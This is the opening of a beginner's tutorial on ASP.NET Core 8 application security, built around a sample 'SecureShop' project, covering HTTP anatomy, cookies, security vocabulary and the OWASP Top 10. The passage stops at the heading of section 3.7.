# Securing .NET Applications — The Complete Zero-to-Specialist Guide

> **APIs and MVC, explained line by line and word by word, starting from absolute zero, ending as a .NET Application Security Analyst.**
>
> Target: **ASP.NET Core 8 (LTS)** · Project: **SecureShop** (one MVC shop + one Web API, built and hardened across every chapter) · Language: English · Level: **Zero → Specialist**

---

## About This Guide

Most security tutorials make you choose: either a dry concept book that never shows code, or a code cookbook that never explains *why*. This guide refuses that choice. Every chapter follows the same teaching path — **introduction → history → what it gives you → why you need it → word-by-word concepts → line-by-line code → vulnerable vs. fixed → analyst's checklist → recap** — and every chapter builds directly on the one before it.

By the end, you will have done all of the following, with your own hands:

1. **Built** a real two-app solution in C#/.NET 8 (an MVC storefront and a REST API) from an empty folder.
2. **Secured** it end to end: password hashing, ASP.NET Core Identity, cookies, JWT, OAuth 2.0/OpenID Connect, roles, claims, policies.
3. **Attacked it** — safely, in your own lab: SQL injection, XSS, CSRF, IDOR, SSRF, unsafe deserialization, open redirects, path traversal, malicious uploads — each one planted deliberately, executed, then permanently fixed.
4. **Hardened** it: TLS, the Data Protection API, cryptography, security headers, CORS, rate limiting, audit logging, safe error handling.
5. **Analyzed** it like a hired professional: threat models (STRIDE), security code reviews mapped to OWASP ASVS, SAST/DAST tooling, and a written security report.

That last skill set — the analyst's skill set — is the destination. Everything before it exists so that when you review someone else's code, you can *feel* the attack before you can spell it.

## Who This Is For

- You have **zero** security knowledge. Truly zero. Chapter 1 explains what a web application is.
- You may also have zero C#/.NET knowledge — Part I builds the mental model before any security topic appears.
- If you *do* already write C#, Part I will still be worth reading: it fixes vocabulary that most self-taught developers never verified, and every later chapter depends on that vocabulary being exact.
- You want to end up employable as a **.NET application security analyst** — the person who reviews, tests, threat-models, and reports on .NET systems — and you accept that this takes real reading and real typing.

## What You Need

- A Windows, macOS, or Linux machine.
- The **.NET 8 SDK** (Chapter 4 shows the one command that checks it).
- **Visual Studio Code** with the C# extension (or Visual Studio / Rider — anything that edits C#).
- A modern browser (we will live inside its Developer Tools a lot).
- `curl` (pre-installed on macOS/Linux, available on Windows 10+).
- **Nothing else.** No paid tools. No prior certificates. No experience.

## How to Read This Guide

- **Chapters are cumulative.** Chapter 11 assumes the login you wrote in Chapter 6. Chapter 14 assumes the cookie you configured in Chapter 7. Do not skip.
- **Type the code yourself.** Muscle memory is a security analyst's asset — pattern recognition in code comes from having typed patterns, not from having read them.
- The **SecureShop** project starts as a deliberately naive app in Chapter 4 and ends as a hardened, auditable system in Chapter 22. You watch a codebase grow up — and later, when you review broken codebases professionally, you will recognize every stage of that growth.
- Break things on purpose. Every `[ATTACK]` block is safe to run **only against your own lab on `localhost`**. Never against systems you do not own or have written permission to test.

## Conventions Used Everywhere

| Marker | Meaning |
|---|---|
| `[RULE]` | A law of secure design. Memorize it; it transfers to every language. |
| `[DANGER]` | A mistake seen again and again in real-world .NET code audits. |
| `[VULNERABLE]` | Code written **insecurely on purpose**, to teach the attack. Never copy it. |
| `[FIXED]` | The production-grade version of the same code. |
| `[ATTACK]` | The attacker's point of view: how this gets exploited. |
| `[ANALYST LENS]` | How a security analyst hunts for this issue in code they didn't write. |
| `[LAB]` | Something for you to physically do right now. |
| `word` **(word-by-word)** | A term broken down to plain-English meaning the first time it appears. |

## The Roadmap

```
PART I    FOUNDATIONS ............ Chapters 1-4    What the web is, how HTTP talks,
                                                            and our lab is born.
PART II   AUTHENTICATION ......... Chapters 5-9    "Who are you?" — passwords, Identity,
                                                            cookies, JWT, OAuth 2.0/OIDC.
PART III  AUTHORIZATION .......... Chapters 10-11   "What are you allowed to do?" — roles,
                                                            claims, policies, IDOR.
PART IV   THE ATTACK CATALOG ..... Chapters 12-16   OWASP Top 10 on real .NET code: SQLi,
                                                            XSS, CSRF, SSRF, uploads...
PART V    DATA PROTECTION ........ Chapter 17      TLS, the Data Protection API, AES-GCM,
                                                            and where secrets live.
PART VI   HARDENING & OPS ........ Chapters 18-19   CORS, security headers, rate limits,
                                                            logging, auditing, safe errors.
PART VII  BECOMING THE ANALYST ... Chapters 20-22   Threat modeling, code review,
                                                            DAST tools, your career path.
```

## Table of Contents

### Part I: Foundations
- [Chapter 1: What Is a Web Application and Where Does .NET Fit](#chapter-1-what-is-a-web-application-and-where-does-net-fit)
- [Chapter 2: HTTP, Browsers, and the Anatomy of a Request](#chapter-2-http-browsers-and-the-anatomy-of-a-request)
- [Chapter 3: Thinking Like a Defender: Security Concepts and OWASP](#chapter-3-thinking-like-a-defender-security-concepts-and-owasp)
- [Chapter 4: Building the Lab and the SecureShop Project](#chapter-4-building-the-lab-and-the-secureshop-project)

### Part II: Authentication
- [Chapter 5: Passwords and Hashing](#chapter-5-passwords-and-hashing)
- [Chapter 6: ASP.NET Core Identity from Zero](#chapter-6-aspnet-core-identity-from-zero)
- [Chapter 7: Cookie Authentication in MVC](#chapter-7-cookie-authentication-in-mvc)
- [Chapter 8: JSON Web Tokens (JWT) for APIs](#chapter-8-json-web-tokens-jwt-for-apis)
- [Chapter 9: OAuth 2.0 and OpenID Connect](#chapter-9-oauth-20-and-openid-connect)

### Part III: Authorization
- [Chapter 10: Roles, Claims, and Policies](#chapter-10-roles-claims-and-policies)
- [Chapter 11: Broken Access Control and IDOR](#chapter-11-broken-access-control-and-idor)

### Part IV: The Attack Catalog
- [Chapter 12: SQL Injection](#chapter-12-sql-injection)
- [Chapter 13: Cross-Site Scripting (XSS)](#chapter-13-cross-site-scripting-xss)
- [Chapter 14: Cross-Site Request Forgery (CSRF)](#chapter-14-cross-site-request-forgery-csrf)
- [Chapter 15: SSRF, Unsafe Deserialization, Open Redirects, and Path Traversal](#chapter-15-ssrf-unsafe-deserialization-open-redirects-and-path-traversal)
- [Chapter 16: File Upload Security](#chapter-16-file-upload-security)

### Part V: Data Protection
- [Chapter 17: TLS, Cryptography, and Secret Management](#chapter-17-tls-cryptography-and-secret-management)

### Part VI: Hardening and Operations
- [Chapter 18: CORS, Security Headers, and Rate Limiting](#chapter-18-cors-security-headers-and-rate-limiting)
- [Chapter 19: Logging, Auditing, and Error Handling](#chapter-19-logging-auditing-and-error-handling)

### Part VII: Becoming the Analyst
- [Chapter 20: Threat Modeling with STRIDE](#chapter-20-threat-modeling-with-stride)
- [Chapter 21: Security Code Review](#chapter-21-security-code-review)
- [Chapter 22: Security Testing, Tools, and Your Career Path](#chapter-22-security-testing-tools-and-your-career-path)

---

# Part I: Foundations

## Chapter 1: What Is a Web Application and Where Does .NET Fit

> "You cannot secure what you cannot explain."

### 1.1 What You Will Learn in This Chapter

Before a single security concept appears, you need a rock-solid mental picture of *what it is we are protecting*. In this chapter you will learn, word by word, what the Internet is, what a web application actually is, where the .NET platform came from, and how its two workhorses — **MVC** and **Web API** — differ. Every later chapter stands on these definitions. If you already write web applications, read it anyway: it will sharpen vocabulary you use daily but may never have had explained precisely.

### 1.2 The Internet in One Minute

The Internet is, at its core, a **network of networks**: millions of computers that agreed on common languages ("protocols") so they can exchange information. Two of those languages matter enormously to us.

- **IP — Internet Protocol** *(word-by-word: "Internet" = inter-network, "Protocol" = an agreed set of rules)*. Every machine on the network gets an address — an **IP address**, such as `93.184.216.34` — just like every house gets a street address. IP's job is moving small packets of data from one address to another. It does not care what the data means.
- **HTTP — HyperText Transfer Protocol** (we dissect it fully in Chapter 2). HTTP sits *on top of* IP and defines the meaning of the conversation: requests and responses, files and forms, cookies and headers. Nearly every attack in this guide is, at the bottom, a maliciously crafted HTTP conversation.

Two roles exist in any web conversation:

- A **client** *(word-by-word: from Latin "cliens", one who relies on or depends on another — here, the party that asks)* — the program that **initiates** a request. Usually your browser (Chrome, Firefox, Edge), but just as often a mobile app, another server, or a script an attacker wrote.
- A **server** *(word-by-word: the party that serves — answers requests)* — a program that **listens** for requests and responds. When you write an ASP.NET Core application, *your program is the server*.

> [RULE] In security, never assume the client is your browser, and never assume the client is friendly. The client is *anyone or anything* that can speak HTTP to your server — including a program controlled by an attacker who read this same tutorial.

One more piece: **DNS — Domain Name System** — the Internet's phone book. Humans type `secureshop.local`; DNS translates that name into an IP address so IP can deliver the packets. This matters to us later: DNS names decide cookie scope (Chapter 7), TLS certificates (Chapter 17), and which origins may call your API (Chapter 18).

### 1.3 What Exactly Is a Web Application?

A **web application** is a program that runs on a server and is *used remotely through HTTP* — the user's browser (or app) sends requests, the program computes, and it answers with documents (usually **HTML**, **JSON**, or both). Compare that with a *desktop* application, which runs entirely on your machine and has no remote user at all.

- A **static website** is a folder of ready-made files. The server's only job is to hand them over exactly as stored. There is still security (file permissions, TLS, headers — Chapters 17-18), but no logic to exploit.
- A **dynamic web application** *builds* each answer at request time: logins, shopping carts, prices, orders, database queries. Every piece of logic that decides *what to answer* is a place where a bug can live — and a bug in security-relevant logic is a **vulnerability** *(word-by-word: from Latin "vulnus", wound — a wound in the system through which it can be hurt)*.

SecureShop, the project you will build, is dynamic: products come from a database, carts belong to users, and prices must only be changeable by admins. All of that is *logic*, and all of that logic can be attacked — so all of it must be secured.

### 1.4 A Short History: From CGI to ASP.NET Core 8

Security intuition improves when you know *why* each technology exists — each generation solved yesterday's problem and quietly created tomorrow's attack. Keep this timeline; we will refer back to it.

| Year | Technology | What it solved | New attack surface it created |
|---|---|---|---|
| 1991 | **CGI** (Common Gateway Interface) | Let web servers run external programs per request | Spawning a process per request; passing user input to shell commands — the birth of command injection |
| 1996 | **ASP "Classic"** (Active Server Pages) | Interpreted VBScript *inside* HTML pages — fast dynamic sites | Interleaving code and markup; SQL string concatenation habits that haunt us in Chapter 12 |
| 2002 | **ASP.NET Web Forms** (.NET Framework) | Compiled, event-driven, drag-and-drop web UIs | Hidden `__VIEWSTATE` blobs (deserialization risks — Chapter 15) and an abstraction that hid HTTP itself |
| 2009 | **ASP.NET MVC** | Clean separation of models, views, controllers; testability; control over generated HTML | Developers now owned every byte of HTML — and every XSS hole in it (Chapter 13) |
| 2016 | **ASP.NET Core 1.0** | Cross-platform, open-source, high-performance rewrite | A new middleware pipeline (Chapter 18) everyone had to relearn |
| 2020 | **.NET 5+** | "One .NET" — the platform unified; versions numbered by year | Legacy dangerous APIs (BinaryFormatter) progressively disabled (Chapter 15) |
| 2023 | **.NET 8 (LTS)** | Today's Long-Term-Support baseline — our target | Our job: use its modern security APIs *correctly* |

**Moral of the history:** every abstraction that "hides the web" (Web Forms) or "hides the database" (string-concatenated SQL) was eventually punished. This guide shows you the safe way to use each modern abstraction, *and* what it looks like when someone uses the dangerous leftover habits.

### 1.5 The Words: .NET, C#, ASP.NET Core, CLR, SDK

These five words get confused constantly. Fix them now:

- **C#** — a programming language. Just the language: its grammar and vocabulary. analogy: *the language a letter is written in.*
- **.NET** — the platform: the runtime that executes compiled C#, plus the giant standard library (thousands of pre-built classes — including all the security classes we will use: `PasswordHasher`, `AesGcm`, `RandomNumberGenerator`...). analogy: *the postal service that understands the language.*
- **CLR — Common Language Runtime** — the component *inside* .NET that actually runs your program: memory management, type safety, garbage collection. The CLR is a silent security hero — buffer overflows, the classic plague of C/C++, are structurally much harder in .NET because the CLR refuses to let you misuse memory the same way.
- **ASP.NET Core** — the part of .NET that builds *server-side web applications*: HTTP handling, MVC, Web API, authentication middleware — everything this guide is about.
- **SDK — Software Development Kit** — the download that gives you the `dotnet` command, the compiler, templates, and NuGet package access. Chapter 4 verifies it is installed.

### 1.6 The MVC Pattern, Word by Word

**MVC — Model-View-Controller** is a way of organizing a web application's code so that *data*, *presentation*, and *decisions* live in separate files. The word "pattern" means: a proven repeatable design, not a product.

- **Model** *(word-by-word: a simplified representation of a real thing)* — the classes that hold your data and rules: `Product`, `Order`, `AppUser`. A `Product` has a `Name` and a `Price`. The model knows nothing about HTML.
- **View** *(word-by-word: what the user sees)* — the template that turns models into HTML. In ASP.NET Core, views are **Razor** files (`.cshtml` — "C# HTML"): HTML with a sprinkle of C#. We examine Razor's security behavior line by line in Chapter 13 — its default HTML-*encoding* is one of the best silent protections in the platform.
- **Controller** *(word-by-word: the one in control — it decides)* — the C# class that receives an HTTP request, talks to models/data, and chooses which view to render (or which JSON to return). Controllers are where most security decisions live: who may call this action? what input is acceptable? We will write and harden many controllers.

A request through MVC, step by step:

```
Browser: GET /products
   -> Routing matches the URL to ProductsController.Index()   (the "route table")
   -> Index() loads Product data (Models)
   -> Index() passes that data to a View
   -> View renders HTML
   -> Server responds: 200 OK + HTML
```

The browser never speaks to models or views directly — only to controllers. Remember this when we secure inputs (Chapter 12) and outputs (Chapter 13): *input* enters through the controller, *output* leaves through the view (or through JSON for APIs).

### 1.7 The Web API Pattern, Word by Word

A **Web API** is a server program whose clients are *other programs*, not human eyes. Instead of returning HTML, it returns **data**, almost always as **JSON**.

- **API — Application Programming Interface** *(word-by-word: an interface — a defined set of doors — through which one application is programmed to talk to another)*.
- **REST** — "REpresentational State Transfer": a widely-followed style where URLs name *resources* (`/api/products/17` — product number 17) and HTTP verbs say what to do to them (`GET` = read, `POST` = create, `PUT`/`PATCH` = update, `DELETE` = remove). REST is a style, not a law — but clients will *assume* it, and wrong verbs cause real vulnerabilities (Chapter 14).
- **JSON** — JavaScript Object Notation: `{"id":17,"name":"Yirgacheffe","price":18.50}`. Machines parse it cheaply. Attackers also hand-craft it cheaply — never trust it just because it looks structured (Chapter 12).

Typical modern architecture (ours, in SecureShop):

```
[Browser] --HTML--> [MVC App (SecureShop.Web)]  --HTTP/JSON--> [API (SecureShop.Api)] --SQL--> [Database]
```

The MVC app is a *client of the API*. That one sentence causes a huge number of real-world vulnerabilities, because developers assume server-to-server calls are trustworthy (Chapter 18: CORS, and Chapter 11: access control — where you will learn the API must *still* check who is calling, and on whose behalf).

### 1.8 Where Security Enters the Picture

Your application's **attack surface** *(word-by-word: the total set of points where an attacker can interact with it)* is, quite literally, every URL you expose, every input field on every page, every header you read, and every file you accept. A mental habit to build from this exact moment:

> [RULE] **Every byte of input that arrives at your server is chosen by the sender, and the sender is free to send anything at all.** Hidden form fields, disabled dropdowns, "readonly" inputs, and JSON your own frontend generated — none of that is a contract. It is a *suggestion from a stranger*.

The history of the next 22 chapters in one sentence: attackers learned to lie through inputs, defenders learned to distrust inputs, and the .NET platform built tools (Identity, EF Core, Razor, antiforgery, Data Protection) so we can *distrust systematically instead of manually*.

### 1.9 Recap

- The Internet moves packets (IP); HTTP gives conversations meaning; DNS names addresses.
- A client initiates; your server responds; the client may be an attacker's script.
- MVC separates Model (data), View (HTML out), Controller (decisions); Web APIs speak JSON to programs.
- .NET = platform, C# = language, CLR = runtime, ASP.NET Core = the web part, SDK = your toolbox.
- Attack surface = every interaction point; all input is hostile; every later chapter builds on this.

**Next:** Chapter 2 tears an actual HTTP request apart, line by line — because you cannot read Chapter 12's SQL injection payloads without being fluent in the language they are written in.
## Chapter 2: HTTP, Browsers, and the Anatomy of a Request

> "Attacks are not magic. They are HTTP requests you did not expect."

### 2.1 What You Will Learn in This Chapter

Every vulnerability in this guide — SQL injection, XSS, CSRF, JWT theft, IDOR — is expressed as crafted HTTP. Here you will learn to read and write raw HTTP fluently: URLs, methods, status codes, headers, cookies, and bodies. You will use the browser's Developer Tools and `curl` as your first analyst instruments. This chapter is the language lesson for everything that follows.

### 2.2 Anatomy of a URL, Word by Word

When you click a link, the browser parses this string:

```text
https://localhost:7101/products/search?query=yirgacheffe&page=2#reviews
```

- `https` — the **scheme**: which protocol to speak. `https` = HTTP *inside a TLS tunnel* (Chapter 17). The scheme decides whether bytes travel encrypted (`https`) or in the clear, sniffable by anyone on the network path (`http`).
- `localhost` — the **host**: a DNS name (or an IP) identifying *which server* to talk to. `localhost` is special: it always means *this same machine* — which is why our lab is private to you.
- `7101` — the **port**: which *door* of that machine to knock on. A machine listens on many numbered ports; HTTPS defaults to 443, HTTP to 80. Our lab pins explicit ports so chapters stay consistent.
- `/products/search` — the **path**: *what* on that server you are asking for. In ASP.NET Core, the path is matched by **routing** to a controller action (Chapter 1).
- `?query=yirgacheffe&page=2` — the **query string**: named parameters after a `?`, separated by `&`. Remember these names — `query` and `page` arrive at your action method as *input*.
- `#reviews` — the **fragment**: *client-side only* — the browser scrolls to it; it is **never sent to the server**. (Later: some frameworks mis-handle fragments — they matter in XSS payloads like `#<script>` for DOM-based attacks, Chapter 13.)

> [RULE] The full URL, including the query string, is stored in browser history, server logs, proxy logs, and the `Referer` header. **Never put secrets (tokens, passwords, sensitive IDs) in a URL.** In Chapter 19 you will learn to keep them out of logs too.

### 2.3 The HTTP Request: An Envelope

Under the hood, the browser sends plain text to the server. This is a complete, real request:

```http
POST /cart/checkout HTTP/1.1
Host: localhost:7101
Content-Type: application/x-www-form-urlencoded
Cookie: .AspNetCore.Cookies=CFAM...long-encrypted-blob...
Content-Length: 31
Referer: https://localhost:7101/cart

productId=17&quantity=2
```

Read it line by line:

1. `POST /cart/checkout HTTP/1.1` — the **request line**: *method* (`POST`), *path* (`/cart/checkout`), *protocol version*.
2. `Host: localhost:7101` — which named site this request targets (one IP can serve many sites).
3. `Content-Type: application/x-www-form-urlencoded` — the **MIME type** of the body: here, a classic HTML form submission. Bodies can also be `application/json` (APIs) or `multipart/form-data` (file uploads — Chapter 16). [DANGER] The browser sets this — so an *attacker's* tool can set it to anything. Never trust `Content-Type` alone to prove what a body contains.
4. `Cookie: ...` — the browser **automatically attaches** every matching cookie to every request. This single line powers both authentication (Chapter 7) *and* one of the most famous attacks on the web (CSRF, Chapter 14).
5. `Content-Length: 31` — how many bytes follow the blank line, so the server knows where the request ends.
6. A blank line — the separator between **headers** and **body**.
7. `productId=17&quantity=2` — the **body**: the actual data, form-encoded.

The server never "sees" a click on a button. It sees *this text*. Anything that can produce this text — a form, JavaScript, `curl`, an exploit script — is an equally valid client as far as the server knows. **That is the entire foundation of web attack technique.**

> [ATTACK] When a tutorial says "the attacker submits a crafted request", it means exactly this: they typed a request like the one above — with different words — into a command-line tool. There is no magic; from Chapter 12 onward, *you* will be the attacker (in your own lab).

### 2.4 HTTP Methods and Their Meaning

| Method | Meaning | Body? | Security meaning |
|---|---|---|---|
| `GET` | Read a resource | No (by convention) | Should never change anything; safe to link, prefetch, cache. **Never** accept a password-changing or purchase action via GET. |
| `POST` | Submit/perform an action (create, process) | Yes | The workhorse of forms and APIs; requires CSRF protection when cookie-authenticated (Chapter 14). |
| `PUT` | Replace a resource entirely | Yes | Usually means "edit" in APIs — must be authorization-checked (Chapter 11). |
| `PATCH` | Partially modify a resource | Yes | Same as PUT; watch for "mass assignment" style field injection (Chapter 11). |
| `DELETE` | Remove a resource | Rare | The most dangerous verb to leave unguarded. |

An endpoint that changes data should normally use a *writing* method; an endpoint that only reads should use `GET`. [ANALYST LENS] When reviewing code, `GET /api/orders/delete/17` is an immediate finding — state-changing work on a cacheable, linkable, prefetch-triggering method.

### 2.5 Status Codes: The Server's Reply Card

The first line of every response is `HTTP/1.1 <code> <reason>`. Families:

| Family | Meaning | Codes you must know cold |
|---|---|---|
| `2xx` | Success | `200 OK` (fine), `201 Created` (new resource — correct response to POST that creates) |
| `3xx` | Redirect | `301` permanent move, `302` temporary move (used after successful login) |
| `4xx` | **Client's fault** | `400 Bad Request`, `401 Unauthorized`, `403 Forbidden`, `404 Not Found`, `429 Too Many Requests` |
| `5xx` | **Server's fault** | `500 Internal Server Error` (a crash — leaks info if handled badly, Chapter 19) |

Two codes are confused weekly by developers, and the difference is a security requirement:

- **`401 Unauthorized`** — the *name is wrong*; it means **Unauthenticated**: "I do not know who you are." (No/invalid credentials.)
- **`403 Forbidden`** — "I know exactly who you are, and you may not do this." (Authenticated, but not allowed.)

> [RULE] `401` = *who are you?* · `403` = *I know you — and no.* Leaking the wrong one reveals information: returning `403` for an unauthenticated user confirms the resource exists; returning `404` instead of `403` hides its very existence (Chapter 11 discusses this trade-off).

### 2.6 Headers That Matter for Security

Headers are the `Name: value` lines in both directions. As an analyst you will live in them:

- `Cookie` / `Set-Cookie` — cookies in/out. Attributes we harden in Chapter 7: `HttpOnly`, `Secure`, `SameSite`.
- `Authorization: Bearer eyJhbGc...` — how APIs receive tokens (Chapter 8). `Bearer` *(word-by-word: the bearer — whoever holds this token)* — meaning possession *is* identity, which is why token theft is so serious.
- `Content-Type` — what the body claims to be.
- `Referer` — (yes, historically misspelled; the spec kept the typo) — the page that linked here.
- `User-Agent` — the browser's self-introduction. [DANGER] Trivially forged; blocking "bad" user agents is security theater.
- Response headers we will add deliberately in Chapter 18: `Content-Security-Policy`, `X-Frame-Options`, `X-Content-Type-Options`, `Strict-Transport-Security`.

### 2.7 Cookies: The Hand-Stamp

HTTP by itself is **stateless** *(word-by-word: state-less — remembers nothing between requests)*: the server treats every request as a stranger's. That is unusable for logins and carts, so in 1994 Netscape invented the **cookie**: a small `name=value` pair the server asks the browser to *remember and replay automatically*.

How it works, request by request:

```http
HTTP/1.1 200 OK
Set-Cookie: cart=abc123; Path=/; HttpOnly; Secure; SameSite=Lax
```

From then on, the browser silently appends `Cookie: cart=abc123` to *every* matching request — no JavaScript, no user action needed. Two consequences define the next dozen chapters:

1. **Good:** this is how you stay logged in across requests (Chapter 7 turns it into a secure, encrypted authentication ticket).
2. **Dangerous:** *any website the user visits* can cause requests to your site with those cookies attached — the cookie follows the request even if the request was forged by an enemy page. That is Chapter 14, CSRF.

Cookie attributes, word by word (we set these precisely in Chapter 7): `HttpOnly` — JavaScript may NOT read it (blunts XSS token theft); `Secure` — only send over HTTPS; `SameSite=Lax|Strict` — don't attach cookies on cross-site subrequests (a partial CSRF vaccine); `Path`/`Domain` — where it is sent; `Expires/Max-Age` — lifetime (session cookie = dies with the browser).

### 2.8 LAB: Watch HTTP With Your Own Eyes

Do this now — it is the single most important habit of this entire guide.

1. Open any site in Chrome/Firefox → press **F12** → open the **Network** tab → reload the page. Click the first request: inspect its *Headers*, *Payload* (body), and *Cookies* tabs. Every chapter of this guide refers back to this view.
2. Now drive HTTP by hand, with zero browser:

```bash
curl -v https://example.com
```

`-v` (verbose) prints the whole conversation: request line, headers, response, body. You will see exactly the text from § 2.3 — you are now speaking raw HTTP. Two more you will use constantly:

```bash
curl -X POST https://localhost:7102/api/demo \
     -H "Content-Type: application/json" \
     -d '{"name":"attacker"}'
```

`-X` sets the method, `-H` adds a header, `-d` supplies the body (and implies POST). From Chapter 8 onward, you will paste stolen-looking tokens into `-H "Authorization: Bearer ..."` exactly like a real attacker, and watch the API obey.

### 2.9 Why Attackers Love HTTP (and Why Defenders Must Know It Better)

Everything an attacker does to your app arrives as text you just learned to read: a `GET` with a `'` in the query string (SQL injection), a `POST` body containing `<script>` (XSS), a forged cross-site form carrying the victim's cookie (CSRF), a header that quietly changes identity (JWT attacks). There is no separate "hacking protocol" — there is only HTTP used assertively.

> [ANALYST LENS] Professional habit #1: for every feature you review or build, ask *"what requests does this answer, and what would I answer if I were lying?"* — You have just learned enough to ask that question. The remaining chapters teach you what lies are worth telling.

### 2.10 Recap

- URL = scheme + host + port + path + query; the query string is logged everywhere — no secrets in it.
- Request = request line + headers + blank line + body; servers cannot tell a real browser from `curl`.
- Methods carry meaning: GET reads, POST/PUT/PATCH/DELETE write.
- 401 vs 403: "who are you" vs "no, you may not".
- Cookies are replayed automatically — the root of both sessions and CSRF.
- DevTools Network tab and `curl -v` are your first analyst tools.

**Next:** Chapter 3 gives you the defender's vocabulary — what "threat", "vulnerability", "risk", and "OWASP" mean — and why the industry has a Top 10 list at all.
## Chapter 3: Thinking Like a Defender: Security Concepts and OWASP

> "You can't patch what you can't name."

### 3.1 What You Will Learn in This Chapter

Security has a precise professional vocabulary. This chapter teaches it word by word — asset, threat, vulnerability, exploit, risk, attack surface, authentication vs. authorization — then introduces **OWASP**, its history, and the famous **Top 10** list that organizes the entire discipline of web defense. After this chapter, the playground is ready: Chapter 4 builds the lab.

### 3.2 A Short History of Web Insecurity

Security concepts stick when you know what forced each one into existence.

- **1988 — The Morris Worm.** Robert Tappan Morris Jr.'s worm infected ~10% of the young Internet by exploiting weak configurations and guessable passwords. Result: the first felony conviction under the US Computer Fraud and Abuse Act, and the birth of coordinated incident response (CERT). Lesson the industry keeps relearning: *default and weak credentials are an attack class of their own* (you will enforce strong credentials in Chapters 6 and 18).
- **1998 — SQL injection goes public.** Rain Forest Puppy's advisories showed that user input concatenated into database queries hands the database to the attacker. Almost **three decades later** it is still in the OWASP Top 10 — because string-built SQL is still being written (Chapter 12).
- **2000 — "Cross-Site Scripting" gets its name.** Microsoft security engineers named attacks where one user's content executes as code in another user's browser. In **2005**, the "Samy" MySpace worm added one million friends to its author in 20 hours using exactly this technique — the first *viral* XSS. (Chapters 7 and 13.)
- **2001 — OWASP founded.** Mark Curphey starts the **Open Web Application Security Project** — an open, vendor-neutral community to make web security *knowledge* free and standardized. OWASP's signature artifacts: the **Top 10** (below), **ASVS** (verification standard, Chapter 21), **Cheat Sheets** (practical per-topic guides), and **ZAP** (attack tool, Chapter 22).
- **2013 / 2017 / 2021 — Mega-breach era.** Target (~40M cards, via an HVAC vendor's stolen credentials — *trust boundaries* matter), Equifax (147M people, via an unpatched library — *dependency scanning*, Chapter 22), and a steady stream of deserialization and injection disasters.
- **2021 — Log4Shell.** A logging library's parser flaw let a *log message* execute code — reminder that even your *infrastructure's* libraries are attack surface, and why Chapter 22 closes the course with supply-chain scanning.

### 3.3 The Vocabulary, Word by Word

Learn these as a lawyer learns terms: exact meaning, no hand-waving.

- **Asset** — anything worth protecting: data (passwords, orders), functions (payment), reputation, uptime. Security work starts by listing assets.
- **Threat actor** — the who: an external hacker, an insider, an automated bot, or a *compromised* legitimate user.
- **Threat** — *what could go wrong and who would make it so*: "an attacker reads other users' order history."
- **Vulnerability** — a *weakness in your system* that makes the threat possible: the orders endpoint never checks ownership (you will build, exploit, and fix exactly this in Chapter 11).
- **Exploit** — the concrete technique/tool that uses a vulnerability: the URL `GET /api/orders/1042` that returns someone else's order.
- **Attack** — the act of running the exploit, possibly chained with others.
- **Risk** — the professional's bottom line: **Risk = Likelihood × Impact**, tempered by controls. A dangerous vulnerability nobody can reach is low risk; a trivially reachable one on your crown-jewel asset is critical. (Chapter 21 grades findings this way.)
- **Control (mitigation)** — anything that lowers risk: code fixes, configuration, rate limits, logging. The fix sections of Chapters 11-19 are all controls.
- **Defense in depth** — layering controls so a single failure is survivable: even if input validation fails, output encoding still stops XSS; even if XSS fires, `HttpOnly` still protects the cookie.

And the pair everyone confuses:

- **Authentication (AuthN)** *(word-by-word: "authentic" — genuine; proving genuineness)* — answering **"WHO are you?"** with evidence (a correct password, a valid token). Result: the server knows *which identity* is calling.
- **Authorization (AuthZ)** *(word-by-word: the process of making someone "authorized" — permitted)* — answering **"may THIS identity do THAT?"** Result: allow or deny, per specific action.

Passport analogy: **AuthN** is showing the passport at border control (proving you are you). **AuthZ** is the visa/stamp deciding which doors you may walk through. A perfect AuthN with broken AuthZ is a bank that checks IDs carefully at the entrance, then lets everyone into the vault — this is precisely the #1 flaw in real applications (OWASP A01, Chapter 11).

### 3.4 The CIA Triad: What "Secure" Even Means

Every security control protects at least one of three properties:

- **Confidentiality** *(word-by-word: "confidence" — trusted privacy; keeping secrets secret)* — the wrong people cannot *read* it. Violated by: leaked passwords, IDOR (Ch. 11), missing TLS (Ch. 17), XSS token theft (Ch. 13).
- **Integrity** *(word-by-word: wholeness — data is whole, unchanged, trustworthy)* — the wrong people cannot *change* it (undetected). Violated by: CSRF (Ch. 14) silently posting a checkout, SQLi rewriting prices (Ch. 12), a tampered JWT (Ch. 8).
- **Availability** *(word-by-word: available — usable when needed)* — the right people can *use* the system. Violated by: rate-limit absence (Ch. 18), resource-exhausting uploads (Ch. 16), crash-inducing payloads (Ch. 19).

> [ANALYST LENS] A trick that instantly improves any review: for every control you examine, ask "which letter of CIA does this protect?" If the answer is "none", it is not a security control — it is decoration.

### 3.5 Attack Surface and Trust Boundaries

- **Attack surface** — the complete set of points an attacker can touch: every URL, every input field, every header read, every file accepted, every outbound call, every dependency. Chapters 11-16 walk SecureShop's attack surface one door at a time.
- **Trust boundary** — a line where data crosses from *less* trusted to *more* trusted space. The browser→server line is the most obvious one; the MVC→API call and API→database lines are others. The #1 root cause of real breaches is data crossing a trust boundary **without re-validation** because "it came from our own frontend/other service". Everything in Part II onwards exists to enforce trust boundaries.

### 3.6 OWASP and the Top 10 (2021)

**OWASP** — the Open Web Application Security Project — is the industry's shared reference: not a government, not a vendor; a community that publishes free standards, tools, and documentation. The **Top 10** (revised roughly every 3-4 years: 2003 → 2007 → 2010 → 2013 → 2017 → 2021) is a *risk-ranked awareness list* of the most impactful web application security categories — not a complete catalog, and deliberately simple enough that executives can read it.

The 2021 list, with the chapters where you will defeat each:

| Rank | Category | One-line meaning | You fix it in |
|---|---|---|---|
| **A01** | Broken Access Control | Users can act on data/actions that are not theirs | Ch. 11 |
| **A02** | Cryptographic Failures | Secrets protected badly (or not at all) | Ch. 5, 17 |
| **A03** | Injection | User input executed as code (SQL, HTML, commands) | Ch. 12, 13, 15 |
| **A04** | Insecure Design | The feature design itself is unsafe (no amount of code fixes it) | Ch. 11, 20 |
| **A05** | Security Misconfiguration | Right code, wrong settings (CORS, headers, debug pages) | Ch. 18 |
| **A06** | Vulnerable & Outdated Components | Dangerous libraries shipped into production | Ch. 22 |
| **A07** | Identification & Authentication Failures | Weak login, bad tokens, no lockout | Ch. 5-9, 18 |
| **A08** | Software & Data Integrity Failures | Unsigned updates, unsafe deserialization, poisoned pipelines | Ch. 15 |
| **A09** | Logging & Monitoring Failures | Attacks happen and nobody knows | Ch. 19 |
| **A10** | SSRF (Server-Side Request Forgery) | Server fetches attacker-chosen URLs | Ch. 15 |

Keep this table. When we model SecureShop with STRIDE in Chapter 20 and write a professional report in Chapter 21, you will quote these exact identifiers — that is what a working analyst does.

### 3.7 The Analyst's Mindset: Five Habits

